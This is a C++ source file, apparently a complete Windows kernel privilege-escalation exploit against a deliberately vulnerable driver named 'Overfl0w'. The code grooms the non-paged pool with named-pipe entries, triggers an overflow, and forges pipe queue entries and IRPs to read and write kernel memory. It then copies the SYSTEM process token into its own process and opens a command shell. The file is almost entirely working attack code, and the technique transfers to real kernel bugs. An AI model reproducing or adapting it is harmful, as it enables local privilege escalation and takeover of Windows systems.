#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <vector>

#pragma optimize("", off)

#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
#define ARBITRARY_WRITE_SIZE 8

#define USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE<<32)
#define TOTAL_DATA_SIZE (FIRST_ENTRY_SIZE+SECOND_ENTRY_SIZE+THIRD_ENTRY_SIZE)

#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define assert(e) do {if(!(e)){printf("Assertion failed at line %d: %s\n", __LINE__ , #e);Sleep(-1);}} while(0)

typedef void (IO_APC_ROUTINE)(
    void* ApcContext,
    IO_STATUS_BLOCK* IoStatusBlock,
    unsigned long    reserved
    );

typedef int(__stdcall* NTFSCONTROLFILE)(
    HANDLE           fileHandle,
    HANDLE           event,
    IO_APC_ROUTINE* apcRoutine,
    void* ApcContext,
    IO_STATUS_BLOCK* ioStatusBlock,
    unsigned long    FsControlCode,
    void* InputBuffer,
    unsigned long    InputBufferLength,
    void* OutputBuffer,
    unsigned long    OutputBufferLength
    );

typedef struct {
    SHORT Type;
    USHORT Size;
    PVOID MdlAddress;
    ULONG Flags;
    PVOID AssociatedIrp;
    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    CHAR RequestorMode;
    BOOLEAN PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    BOOLEAN Cancel;
    UCHAR CancelIrql;
    CCHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PVOID UserIosb;
    PVOID UserEvent;
    char Overlay[16];
    PVOID CancelRoutine;
    PVOID UserBuffer;
    CHAR TailIsWrong;
} IRP;

typedef struct {
    uint64_t Flink;
    uint64_t Blink;
    IRP* Irp;
    uint64_t SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
} DATA_QUEUE_ENTRY;


typedef struct {
    HANDLE Read;
    HANDLE Write;
} PIPE_HANDLES;

/////////////////////////////////////

using namespace std;

enum {
    EPROCESS_PID = 0, EPROCESS_TOKEN, EPROCESS_THREADLISTHEAD
};

//EPROCESS offsets to target 1709+
uint64_t c_offsets[][3] = {
    {0x2e0, 0x358, 0x488},
    {0x440, 0x4b8, 0x5e0}
};
int g_setoff = 0;
PIPE_HANDLES* g_victim_pipe = 0;

/////////////////////////////////////

void DriverCall(size_t size) {
    HANDLE h = CreateFile(L"\\\\.\\Overfl0w", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    DeviceIoControl(h, 0x222000, &size, sizeof(size), 0, 0, 0, 0);
}

void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->EntryType = 1;
    dqe->DataSize = -1;
    dqe->Irp = irp;
    irp->AssociatedIrp = (PVOID)read_address;
}

void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
    irp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    irp->AssociatedIrp = source_address;
    irp->UserBuffer = destination_address;
    irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
    irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->Flink = (uint64_t)dqe;
    dqe->EntryType = 0;
    dqe->DataSize = size;
    dqe->Irp = irp;
}


DWORD WINAPI ThreadedWriter(void* arg) {
    char* buf = (char*)arg;
    DWORD res;

    WriteFile(g_victim_pipe->Write, buf, FIRST_ENTRY_SIZE, &res, NULL);

    Sleep(-1);
    return 0;
}

void ReadMem(uint64_t addr, size_t len, char* data) {
    static char* buf = (char*)malloc(TOTAL_DATA_SIZE + 1 + 0x5000);
    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
    DWORD read;

    assert(len < 0x5000);

    PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000), addr);
    PeekNamedPipe(g_victim_pipe->Read, buf, TOTAL_DATA_SIZE + 1 + len, &read, 0, 0);
    memcpy(data, buf + TOTAL_DATA_SIZE + 1, len);
}

uint64_t GetProcessById(uint64_t first_process, uint64_t pid) {
    uint64_t current_pid = 0;
    uint64_t current_process = first_process;
    while (1) {
        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&current_pid);
        if (current_pid == pid)
            return current_process;

        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + 8, 8, (char*)&current_process);
        current_process -= c_offsets[g_setoff][EPROCESS_PID] + 8;

        if (current_process == first_process)
            return 0;
    }
}

void main() {
    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
    HANDLE r, w;
    DWORD res;
    std::vector<PIPE_HANDLES> pipe_pool, free_pipe_pool;
    IO_STATUS_BLOCK isb;

    char* buf = (char*)malloc(TOTAL_DATA_SIZE * 2);

    assert(ARBITRARY_WRITE_SIZE < FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE);

    if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
        printf("Couldn't allocate base address %p\n", USER_DATA_ENTRY_ADDR);
        return;
    }

    for (int i = 0; i < 1001; i++) {
        w = CreateNamedPipe(
            L"\\\\.\\pipe\\exploit_20",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            TOTAL_DATA_SIZE,
            TOTAL_DATA_SIZE,
            0,
            0);
        r = CreateFile(L"\\\\.\\pipe\\exploit_20", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (i < 1000)
            pipe_pool.push_back({ r, w });
        else
            free_pipe_pool.push_back({ r, w });
    }

    printf("Creating the left entries\n");
    for (auto& p : pipe_pool) {
        WriteFile(p.Write, buf, FIRST_ENTRY_SIZE, &res, 0);
    }


    printf("Creating the middle entries\n");
    auto free_pipe = free_pipe_pool.begin();
    for (int i = 0; i < pipe_pool.size(); i++) {
        WriteFile(pipe_pool[i].Write, buf, SECOND_ENTRY_SIZE, &res, 0);
        if (i > 900 && i < pipe_pool.size() - 10 && i % 4 == 0 && free_pipe != free_pipe_pool.end()) {
            WriteFile(free_pipe->Write, buf, SECOND_ENTRY_SIZE, &res, 0);
            free_pipe++;
        }
    }

    printf("Creating the RIGHT entries\n");
    char victim_data[THIRD_ENTRY_SIZE];
    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)victim_data;
    memset(dqe, 0, sizeof(*dqe));
    dqe->DataSize = THIRD_ENTRY_SIZE + 1;

    for (int i = 0; i < pipe_pool.size(); i++) {
        WriteFile(pipe_pool[i].Write, &dqe->Irp, THIRD_ENTRY_SIZE, &res, 0);
    }

    printf("Creating holes in the middle entries\n");
    for (auto& p : free_pipe_pool) {
        ReadFile(p.Read, buf, SECOND_ENTRY_SIZE, &res, 0);
    }

    printf("Calling the vulnerable function\n");
    DriverCall(SECOND_ENTRY_SIZE + NP_HEADER_SIZE);

    DWORD bytes_read;

    for (auto& p : pipe_pool) {
        PeekNamedPipe(p.Read, buf, TOTAL_DATA_SIZE + 1, &bytes_read, 0, 0);
        if (bytes_read == TOTAL_DATA_SIZE + 1) {
            g_victim_pipe = &p;
            printf("Overflown data entry found\n");
            break;
        }
    }

    if (!g_victim_pipe) {
        printf("Couldn't find an overflown data entry, expect a bsod\n");
        Sleep(-1);
    }

    DATA_QUEUE_ENTRY* next_chunk_flink = (DATA_QUEUE_ENTRY*)*(uint64_t*)&buf[TOTAL_DATA_SIZE - 0x20];
    printf("Leaked Flink of next chunk: %p\n", next_chunk_flink);

    uint64_t next_chunk_addr;
    ReadMem((uint64_t)&next_chunk_flink->Blink, 8, (char*)&next_chunk_addr);

    printf("Address of next chunk: %p\n", next_chunk_addr);
    uint64_t current_chunk_addr = next_chunk_addr - THIRD_ENTRY_SIZE - NP_HEADER_SIZE;

    printf("Creating an entry with size greater than the available pipe quota\n");
    CreateThread(0, 0, ThreadedWriter, buf, 0, 0); //we could have used overlapped/completion routines
    Sleep(2000);
    
    //in case of overlapped io, we could have used the following and avoid creating thread/sleeping (in practice a bit more unreliable for some reason):
    //OVERLAPPED overlapped;
    //overlapped.hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
    //WriteFile(g_victim_pipe->Write, buf, FIRST_ENTRY_SIZE, &res, &overlapped);

    uint64_t next_entry, irp_addr;
    ReadMem(current_chunk_addr, 8, (char*)&next_entry);
    printf("Address of created entry: %p\n", next_entry);

    ReadMem(next_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&irp_addr);
    printf("Created entry IRP: %p\n", irp_addr);

    char irp_data[0x1000];
    ReadMem(irp_addr, 0x1000, irp_data);
    IRP* irp = (IRP*)irp_data;

    uint64_t cp_thread_list_head, current_process, current_process_id, system_process;

    //&((ETHREAD*)0)->ThreadListHead.Flink-&((EHREAD)*0)->IrpList=0x38, remains constant between most recent builds
    ReadMem((uint64_t)irp->ThreadListEntry.Flink + 0x38, 8, (char*)&cp_thread_list_head);
    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];
    ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&current_process_id);
    if (current_process_id != GetCurrentProcessId())
        g_setoff++;

    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];

    system_process = GetProcessById(current_process, 4);
    printf("Found current process: %p system process: %p\n", current_process, system_process);

    uint64_t thread_list[2];
    PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN]));

    NtFsControlFile(g_victim_pipe->Write, 0, 0, 0, &isb, 0x119FF8, irp, 0x1000, 0, 0);

    uint64_t unbuffered_entry, unbuffered_irp_addr, forged_irp_addr;
    ReadMem(next_entry, 8, (char*)&unbuffered_entry);
    printf("Data entry that holds the forged IRP: %p\n", unbuffered_entry);

    ReadMem(unbuffered_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&unbuffered_irp_addr);
    printf("Data entry IRP address: %p\n", unbuffered_irp_addr);

    ReadMem(unbuffered_irp_addr + offsetof(IRP, AssociatedIrp), 8, (char*)&forged_irp_addr);

    printf("Forged IRP address: %p\n", forged_irp_addr);
    dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);

    thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);

    printf("Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n");
    ReadFile(g_victim_pipe->Read, buf, ARBITRARY_WRITE_SIZE, &res, 0);
    
    Sleep(200);
    //sleep or in case we were using overlapped io:
    //WaitForSingleObject(overlapped.hEvent, 0);

    system("cmd");
}